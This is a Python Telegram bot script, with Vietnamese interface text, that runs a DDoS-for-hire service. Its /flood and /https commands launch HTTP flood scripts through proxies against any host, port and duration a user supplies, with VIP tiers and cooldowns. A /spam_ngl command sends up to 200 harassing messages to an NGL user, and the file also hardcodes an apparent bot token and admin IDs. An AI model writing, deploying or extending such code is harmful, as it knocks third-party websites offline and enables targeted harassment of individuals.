import telebot
import subprocess
import time
from threading import Thread
import json
import os

BOT_TOKEN = "8203921715:AAEi1EruL1gWgaw_AMLtgal2pkYsoKuF2rM"
bot = telebot.TeleBot(BOT_TOKEN)

VIP_FILE = "vip_users.json"
admin_ids = {7816681280, 7109397100}  # Thay bằng ID thật
proxy_updating = False
vip_cooldowns = {}
normal_cooldowns = {}

# Tải và lưu danh sách VIP
def load_vip_users():
    if os.path.exists(VIP_FILE):
        with open(VIP_FILE, 'r') as f:
            return set(json.load(f))
    return set()

def save_vip_users():
    with open(VIP_FILE, 'w') as f:
        json.dump(list(whitelist_users), f)

whitelist_users = load_vip_users()

# Hồi chiêu
def is_on_cooldown(user_id, mode):
    now = time.time()
    if mode == "vip":
        cooldown = vip_cooldowns.get(user_id, 0)
        if now - cooldown < 20:
            return True, int(20 - (now - cooldown))
        vip_cooldowns[user_id] = now
        return False, None
    else:
        cooldown = normal_cooldowns.get(user_id, {"count": 0, "last": 0})
        if cooldown["count"] >= 2 and now - cooldown["last"] < 200:
            return True, int(200 - (now - cooldown["last"]))
        elif cooldown["count"] >= 2:
            normal_cooldowns[user_id] = {"count": 1, "last": now}
        else:
            normal_cooldowns[user_id] = {"count": cooldown["count"] + 1, "last": now}
        return False, None

# Thông báo sau tấn công
def delayed_notify(user_id, host, port, duration):
    time.sleep(duration)
    bot.send_message(user_id, f"✅ Tấn công đã kết thúc: {host}:{port} ({duration}s)")

# Lặp cập nhật proxy mỗi 30 phút sau khi kích hoạt
def scheduled_update_proxy():
    global proxy_updating
    while proxy_updating:
        time.sleep(1800)  # 30 phút
        subprocess.Popen(["python3", "proxy.py"])

# COMMANDS
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id,
        "🤖 BOT ĐANG SẴN SÀNG .\n"
        "/flood <host> <port> <time>\n/https <host> <port> <time>\n"
        "/spam_ngl <@user> <msg> <số>\n/plan <kiểm tra vip> \n/id <lấy id> \n/admin <danh sách admin>\n/update <update proxy>\n\nMENU ADMIN\n/add <id>\n/kick <id>")

@bot.message_handler(commands=['plan'])
def check_plan(message):
    uid = message.chat.id
    if uid in whitelist_users:
        bot.send_message(uid, "🌟 Bạn là VIP.")
    else:
        bot.send_message(uid, "🔒 Bạn là người dùng thường.")

@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id not in admin_ids:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền.")
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        return bot.send_message(message.chat.id, "❗ /add <user_id>")
    uid = int(args[1])
    whitelist_users.add(uid)
    save_vip_users()
    bot.send_message(message.chat.id, f"✅ Đã thêm {uid} vào VIP")

@bot.message_handler(commands=['kick'])
def kick_user(message):
    if message.from_user.id not in admin_ids:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền.")
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        return bot.send_message(message.chat.id, "❗ /kick <user_id>")
    uid = int(args[1])
    if uid in whitelist_users:
        whitelist_users.remove(uid)
        save_vip_users()
        bot.send_message(message.chat.id, f"❌ Đã xoá {uid} khỏi VIP")
    else:
        bot.send_message(message.chat.id, f"❓ {uid} không có trong danh sách VIP")

@bot.message_handler(commands=['id'])
def get_id(message):
    if message.reply_to_message:
        uid = message.reply_to_message.from_user.id
        name = message.reply_to_message.from_user.first_name
        bot.send_message(message.chat.id, f"🌐 ID của {name} là: {uid}")
    else:
        bot.send_message(message.chat.id, f"🌐 ID của bạn: {message.from_user.id}")

@bot.message_handler(commands=['admin'])
def admin_info(message):
    bot.send_message(message.chat.id, "👑 Bot Dev: VLADIMIR🪐\n☎️ @vladimir_cnc1\n \n👑 admin 2: Hoàng Vương \n☎️@HoangVuongsibidi \n")

@bot.message_handler(commands=['update'])
def update(message):
    global proxy_updating
    uid = message.from_user.id
    if uid not in whitelist_users and uid not in admin_ids:
        return bot.send_message(message.chat.id, "❌ Chỉ VIP/admin được dùng.")
    cooldown, wait = is_on_cooldown(uid, "vip")
    if cooldown:
        return bot.send_message(message.chat.id, f"⏳ Chờ {wait}s")
    if proxy_updating:
        return bot.send_message(message.chat.id, "⚠️ Đang cập nhật tự động rồi...")

    proxy_updating = True
    bot.send_message(message.chat.id, "🔁 Đã bắt đầu cập nhật proxy định kỳ mỗi 30 phút.")
    subprocess.Popen(["python3", "proxy.py"])
    Thread(target=scheduled_update_proxy, daemon=True).start()

@bot.message_handler(commands=['flood', 'https'])
def attack(message):
    uid = message.from_user.id
    args = message.text.split()
    if len(args) != 4:
        return bot.send_message(message.chat.id, "❗ /flood <host> <port> <time>")
    host, port, duration = args[1], args[2], int(args[3])
    is_https = message.text.startswith("/https")
    script = "https.js" if is_https else "floodr.js"
    log_flag = ["--logit"] if is_https else []

    if uid in whitelist_users or uid in admin_ids:
        if duration > 350:
            return bot.send_message(message.chat.id, "❌ VIP tối đa 350s")
        cooldown, wait = is_on_cooldown(uid, "vip")
    else:
        if duration > 150:
            return bot.send_message(message.chat.id, "❌ Thường chỉ 150s")
        cooldown, wait = is_on_cooldown(uid, "normal")

    if cooldown:
        return bot.send_message(message.chat.id, f"⏳ Chờ {wait}s")

    bot.send_message(message.chat.id, f"🚀 Tấn công {host}:{port} ({duration}s)")

    cmd = ["node", script, "GET", host, str(duration), "245", "90", "http.txt",
           "--query", "1", "--delay", "1", "--full", "--http", "mix",
           "--bfm", "true", "--referer", "rand", "--randrate"] + log_flag

    subprocess.Popen(cmd)
    Thread(target=delayed_notify, args=(uid, host, port, duration)).start()

@bot.message_handler(commands=['spam_ngl'])
def spam_ngl(message):
    uid = message.from_user.id
    args = message.text.split()
    if len(args) < 4:
        return bot.send_message(message.chat.id, "❗ /spam_ngl @user msg số_lần")
    username = args[1].lstrip('@')
    count = args[-1]
    if not count.isdigit() or int(count) > 200:
        return bot.send_message(message.chat.id, "❗ Tối đa 200 tin")
    msg = " ".join(args[2:-1]).replace('"', '')
    if uid in whitelist_users or uid in admin_ids:
        cooldown, wait = is_on_cooldown(uid, "vip")
    else:
        cooldown, wait = is_on_cooldown(uid, "normal")
    if cooldown:
        return bot.send_message(message.chat.id, f"⏳ Chờ {wait}s")
    bot.send_message(message.chat.id, f"📤 Đang spam @{username} ×{count}\n💬 {msg}")
    subprocess.Popen(["python3", "spamngl.py", username, count, msg, "http.txt"])

# Khởi chạy bot
print("🤖 Bot đã chạy.")
bot.polling()
